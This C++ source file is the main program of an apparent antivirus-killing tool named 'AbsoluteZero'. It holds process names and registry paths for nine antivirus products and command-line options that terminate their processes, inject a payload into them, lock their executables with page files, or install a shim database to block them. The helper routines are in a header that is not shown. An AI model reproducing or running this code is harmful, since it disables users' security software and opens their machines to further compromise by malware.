//I had a dream,which was not all a dream
//
#include "MainHeader.h"
using namespace std;

//Global init
//Template structure for each av's////////////////////////////////

//AVAST 
AV_struct<3> avast_  =     {"Avast",{L"AvastUI.exe",L"AvastSvc.exe",L"afwServ.exe"},L"AVAST Software\\Avast",L"ProgramFolder",true,PROXYINJECT_ATTACK_1};
//KIS13   (also PROXYINJECT_ATTACK_2)
AV_struct<1> kasp_kis13  = {"KIS13",{L"avp.exe"},L"KasperskyLab\\SetupFolders",L"KAVKIS13",true,DUPHANDLE_ATTACK};
//ESET v6 (also DUPHANDLE_ATTACK)
AV_struct<2> ESET_  =      {"ESET",{L"ekrn.exe",L"egui.exe"},L"ESET\\ESET Security\\CurrentVersion\\Info",L"InstallDir",true,PROXYINJECT_ATTACK_1};
//Avira Internet security
AV_struct<5> Avira_  =     {"AVIRA",{L"avgnt.exe",L"avguard.exe",L"avshadow.exe",L"avmailc.exe",L"avwebgrd.exe"},
						   L"Avira\\AntiVir Desktop",L"Path",true,DUPHANDLE_ATTACK};
//ZoneAlarm
AV_struct<2> ZaLarm_  =    {"ZoneAlarm",{L"zatray.exe",L"vsmon.exe"},L"CheckPoint\\ZoneAlarm\\Installed",L"LOCATION",true,PROXYINJECT_ATTACK_1};
//BitDefender 
AV_struct<6> BitDef_  =    {"BitDefender",{L"bdagent.exe",L"vsserv.exe",L"updatesrv.exe",L"pmbxag.exe",L"seccenter.exe",L"bdapppassmgr.exe"},
						   L"BitDefender",L"InstallDir",false,PROXYINJECT_ATTACK_1};

//AVG internet security 2014 
AV_struct<8> AVG14_  =    {"AVG14",{L"avgfws.exe",L"avgidsagent.exe",L"avgwdsvc.exe",L"avgnsx.exe",L"avgcsrvx.exe",L"avgemcx.exe",L"avgui.exe",L"avgrsx.exe"},
						   L"Avg\\Avg2014",L"AvgDir",true,PROXYINJECT_ATTACK_1};
//Agnitum Outpost
AV_struct<2> Outpost_  =  {"Outpost",{L"op_mon.exe",L"acs.exe"},
						   L"Agnitum\\Security Suite\\Paths",L"Dir",false,PROXYINJECT_ATTACK_1};
//Panda cloud antivirus (also DUPHANDLE_ATTACK)
AV_struct<4> Panda_  =    {"Panda",{L"PSANHost.exe",L"PSUAService.exe",L"PSUAMain.exe",L"PSUNMain.exe"},
						   L"Panda Software\\Setup",L"Path",true,PROXYINJECT_ATTACK_1};

/////////////////////////
//Main AV_list
wstring av_list[] = {L"Avast",L"KIS13",L"ESET",L"Avira",L"ZoneAlarm",L"BitDefender",L"AVG14",L"Outpost",L"Panda",L""};


int process_name_count=0;
bool priv_adjust=false;

/////////////////////////////////////////////////////////////////
void PrintHelp(void)
{
	cout<< "Usage:  AbsoluteZero [-h][-rtkill <AV_name>][-pagelock <AV_name>][-shimlock]"<<endl;
	cout<< "-h         Print this help-information"<<endl;
	cout<< "-rtkill    Kill in runtime AV_process"<<endl;
	cout<< "-pagelock  Lock AV with page file"<<endl;
	cout<< "-shimlock  Lock a lot of AV's with shim-engine method"<<endl;
	cout<< "*************"<<endl;
	cout<< "Examples:"<<endl;
	cout<< "AbsoluteZero -rtkill Avast"<<endl;
	cout<< "AbsoluteZero -pagelock Avast"<<endl;
	cout<< "AbsoluteZero -rtkill Avast -shimlock"<<endl;
	cout<< "*************"<<endl;
	cout<< "Supported AV_list:"<<endl;
	int i =0;
	while(av_list[i]!=L"") 
	{
		wcout<<av_list[i]<<endl;
		i++;
	};

}
//EP
int _tmain(int argc, _TCHAR* argv[])
{

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);  // Get handle to standard output
	if (hConsole==NULL)
	{
		cout<<"[-] Error in GetStdHandle function"<<endl;
		return 0;
	}
	
	cout<< "*********************************************"<<endl;
	cout<< "* AbsoluteZero AntiAV-compilation 2013 v1.0 *"<<endl;
	cout<< "*********************************************"<<endl;
	if (!Heap_init())
	{
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
		cout <<"[-] Heap Creating error"<<endl;
		CloseHandle(hConsole);
		return 0;
	}
	vector <wstring> sources;
	vector <unsigned int> array_PID;
	vector <wstring> process_name_array ;
	wstring av_reg_path;
	wstring av_reg_path_subkey;
	wstring av_reg_path2;
	wstring av_reg_path_subkey2;
	wstring av_install_path;
	wstring	av_install_path2;
	bool wow64;
	wstring image_path  ;
	wstring image_path2 ;
	int  method_type;

	if (argc < 2)
	{
		PrintHelp();
		CloseHandle(hConsole);
		Heap_Destroy();
		return 0;
	}
	//parse arg
    for (int i = 1; i < argc; ++i) 
	{
		wstring arg = argv[i];
		wstring av_name;

        if (arg == L"-h") 
		{
            PrintHelp();
			CloseHandle(hConsole);
			Heap_Destroy();
            return 0;
        }
		else if (arg == L"-rtkill" || arg == L"-pagelock")
		{
			if (i + 1 < argc)
			{
				av_name=argv[++i];
				int r = 0;
				while(av_list[r]!=L"")
				{
					if (av_name==av_list[r])
					{	
						//Check token membership,try to adjust priv
						if (!priv_adjust)
						{
							MainPrivUtil();
							priv_adjust=true;
						}
						SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE|FOREGROUND_GREEN|FOREGROUND_RED);
						wcout<<"[*] Attacked antivirus: "<<av_list[r]<<endl;
						switch(r)
						{
							case 0:
								{
									//avast
									process_name_count = avast_.process_name_count;
									process_name_array.resize(sizeof(avast_.process_name));
									copy(avast_.process_name,avast_.process_name+process_name_count,process_name_array.begin());
									av_reg_path.resize(avast_.reg_path_install.size());
									av_reg_path_subkey.resize(avast_.reg_path_install_subkey.size());
									copy(avast_.reg_path_install_subkey.begin(), avast_.reg_path_install_subkey.end(),av_reg_path_subkey.begin());
									copy(avast_.reg_path_install.begin(), avast_.reg_path_install.end(),av_reg_path.begin());
									wow64= avast_.wow64_reg;
									method_type=avast_.method_type;
									break;
								}
							case 1:
								{
									//KIS13
									process_name_count = kasp_kis13.process_name_count;
									process_name_array.resize(sizeof(kasp_kis13.process_name));
									copy(kasp_kis13.process_name,kasp_kis13.process_name+process_name_count,process_name_array.begin());
									av_reg_path.resize(kasp_kis13.reg_path_install.size());
									av_reg_path_subkey.resize(kasp_kis13.reg_path_install_subkey.size());
									copy(kasp_kis13.reg_path_install_subkey.begin(), kasp_kis13.reg_path_install_subkey.end(),av_reg_path_subkey.begin());
									copy(kasp_kis13.reg_path_install.begin(), kasp_kis13.reg_path_install.end(),av_reg_path.begin());
									wow64= kasp_kis13.wow64_reg;
									method_type=kasp_kis13.method_type;
									break;
								}
							case 2:
								{
									//ESET
									process_name_count = ESET_.process_name_count;
									process_name_array.resize(sizeof(ESET_.process_name));
									copy(ESET_.process_name,ESET_.process_name+process_name_count,process_name_array.begin());
									av_reg_path.resize(ESET_.reg_path_install.size());
									av_reg_path_subkey.resize(ESET_.reg_path_install_subkey.size());
									copy(ESET_.reg_path_install_subkey.begin(), ESET_.reg_path_install_subkey.end(),av_reg_path_subkey.begin());
									copy(ESET_.reg_path_install.begin(), ESET_.reg_path_install.end(),av_reg_path.begin());
									wow64= ESET_.wow64_reg;
									method_type=ESET_.method_type;
									break;
								}
							case 3:
								{
									//Avira
									process_name_count = Avira_.process_name_count;
									process_name_array.resize(sizeof(Avira_.process_name));
									copy(Avira_.process_name,Avira_.process_name+process_name_count,process_name_array.begin());
									av_reg_path.resize(Avira_.reg_path_install.size());
									av_reg_path_subkey.resize(Avira_.reg_path_install_subkey.size());
									copy(Avira_.reg_path_install_subkey.begin(), Avira_.reg_path_install_subkey.end(),av_reg_path_subkey.begin());
									copy(Avira_.reg_path_install.begin(), Avira_.reg_path_install.end(),av_reg_path.begin());
									wow64= Avira_.wow64_reg;
									method_type=Avira_.method_type;
									break;
								}
							case 4:
								{
									//ZoneAlarm
									process_name_count = ZaLarm_.process_name_count;
									process_name_array.resize(sizeof(ZaLarm_.process_name));
									copy(ZaLarm_.process_name,ZaLarm_.process_name+process_name_count,process_name_array.begin());
									av_reg_path.resize(ZaLarm_.reg_path_install.size());
									av_reg_path_subkey.resize(ZaLarm_.reg_path_install_subkey.size());
									copy(ZaLarm_.reg_path_install_subkey.begin(), ZaLarm_.reg_path_install_subkey.end(),av_reg_path_subkey.begin());
									copy(ZaLarm_.reg_path_install.begin(), ZaLarm_.reg_path_install.end(),av_reg_path.begin());
									wow64= ZaLarm_.wow64_reg;
									method_type=ZaLarm_.method_type;
									break;
								}
							case 5:
								{
									//BitDefender
									process_name_count = BitDef_.process_name_count;
									process_name_array.resize(sizeof(BitDef_.process_name));
									copy(BitDef_.process_name,BitDef_.process_name+process_name_count,process_name_array.begin());
									av_reg_path.resize(BitDef_.reg_path_install.size());
									av_reg_path_subkey.resize(BitDef_.reg_path_install_subkey.size());
									copy(BitDef_.reg_path_install_subkey.begin(), BitDef_.reg_path_install_subkey.end(),av_reg_path_subkey.begin());
									copy(BitDef_.reg_path_install.begin(), BitDef_.reg_path_install.end(),av_reg_path.begin());
									wow64= BitDef_.wow64_reg;
									method_type=BitDef_.method_type;
									break;
								}
							case 6:
								{
									//AVG 2014
									process_name_count = AVG14_.process_name_count;
									process_name_array.resize(sizeof(AVG14_.process_name));
									copy(AVG14_.process_name,AVG14_.process_name+process_name_count,process_name_array.begin());
									av_reg_path.resize(AVG14_.reg_path_install.size());
									av_reg_path_subkey.resize(AVG14_.reg_path_install_subkey.size());
									copy(AVG14_.reg_path_install_subkey.begin(), AVG14_.reg_path_install_subkey.end(),av_reg_path_subkey.begin());
									copy(AVG14_.reg_path_install.begin(), AVG14_.reg_path_install.end(),av_reg_path.begin());
									wow64= AVG14_.wow64_reg;
									method_type=AVG14_.method_type;
									break;
								}
							case 7:
								{
									//Agnitum Outpost
									process_name_count = Outpost_.process_name_count;
									process_name_array.resize(sizeof(Outpost_.process_name));
									copy(Outpost_.process_name,Outpost_.process_name+process_name_count,process_name_array.begin());
									av_reg_path.resize(Outpost_.reg_path_install.size());
									av_reg_path_subkey.resize(Outpost_.reg_path_install_subkey.size());
									copy(Outpost_.reg_path_install_subkey.begin(), Outpost_.reg_path_install_subkey.end(),av_reg_path_subkey.begin());
									copy(Outpost_.reg_path_install.begin(), Outpost_.reg_path_install.end(),av_reg_path.begin());
									wow64= Outpost_.wow64_reg;
									method_type=Outpost_.method_type;
								}
							case 8:
								{
									//Panda
									process_name_count = Panda_.process_name_count;
									process_name_array.resize(sizeof(Panda_.process_name));
									copy(Panda_.process_name,Panda_.process_name+process_name_count,process_name_array.begin());
									av_reg_path.resize(Panda_.reg_path_install.size());
									av_reg_path_subkey.resize(Panda_.reg_path_install_subkey.size());
									copy(Panda_.reg_path_install_subkey.begin(), Panda_.reg_path_install_subkey.end(),av_reg_path_subkey.begin());
									copy(Panda_.reg_path_install.begin(), Panda_.reg_path_install.end(),av_reg_path.begin());
									wow64= Panda_.wow64_reg;
									method_type=Panda_.method_type;
								}
								
						}

						if (arg == L"-rtkill")
						{
							//Runtime killing
							for (int i=0;i<process_name_count;i++)
							{
								unsigned int pid_;
								array_PID.resize(0);
								pid_=EnumProc(process_name_array[i],array_PID);
								//Array of PID's
								if (pid_!=NULL)
								{
									for (unsigned int r =0;r<array_PID.size();r++)
									{
										SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
										wcout<<"[+] Found AV_process: "<<process_name_array[i]<<endl;
										///////////////////////////////
										SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE|FOREGROUND_GREEN|FOREGROUND_RED);
										///////////////////////////////
										switch (method_type)
										{
										case DUPHANDLE_ATTACK:
											{
												if(DupHandleAttack(array_PID[r]))
												{
													SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
													wcout<<"[+] Success killing AV_process: "<<process_name_array[i]<<endl;
												}
												else
												{
													SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
													wcout<<"[-] Failed killing AV_process: "<<process_name_array[i]<<endl;
												}
												break;
											}
										case PROXYINJECT_ATTACK_1:
											{

												//Grab from registry AV path information
												if(GetAVpath(av_reg_path,av_reg_path_subkey,av_install_path,wow64))
												{
													image_path=av_install_path+L"\\"+process_name_array[i];
													if(ProxyInjectAttack(image_path,process_name_array[i]))
													{
														SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
														wcout<<"[+] Payload injected to spawned AV_process: "<<image_path<<endl;
													}
												}
												break;
											}
										case PROXYINJECT_ATTACK_2:
											{
												//Grab from registry AV path information
												if(GetAVpath(av_reg_path,av_reg_path_subkey,av_install_path,wow64))
												{
													image_path=av_install_path+L"\\"+process_name_array[i];
													if(ProxyInjectSecond(image_path,process_name_array[i]))
													{
														SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
														wcout<<"[+] Payload injected to spawned AV_process: "<<image_path<<endl;
													}
												}
												break;
											}
										}
									}
								}
							}
						}
						else
						{
							//PageLock
							if(GetAVpath(av_reg_path,av_reg_path_subkey,av_install_path,wow64))
							{
								for (int i=0;i<process_name_count;i++)
								{
									image_path=L"\\??\\"+av_install_path+L"\\"+process_name_array[i]+L".config";
									if(PageLock(image_path))
									{
										SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
										wcout<<"[+] Pagefile created for AV_image: "<<image_path<<endl;
									}
									else
									{
										SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
										wcout<<"[-] Pagefile not created for AV_image: "<<image_path<<endl;
									}
								}
							}	
						}
						break;
					}
					r++;
				};

			}
		}
		else if (arg == L"-shimlock") 
		{
			//Shim engine locking
			if (!priv_adjust)
			{
				MainPrivUtil();
				priv_adjust=true;
			}
			if(ShimEngineLock())
			{
				SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
				wcout<<"[+] ShimDB installed success"<<endl;
			}
			else
			{
				SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
				wcout<<"[-] ShimDB not installed"<<endl;
			}
		}
		else 
            sources.push_back(argv[i]);
	}

	
	
	SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE|FOREGROUND_GREEN|FOREGROUND_RED);
	system("pause");
	CloseHandle(hConsole);
	Heap_Destroy();
	return 0;
}

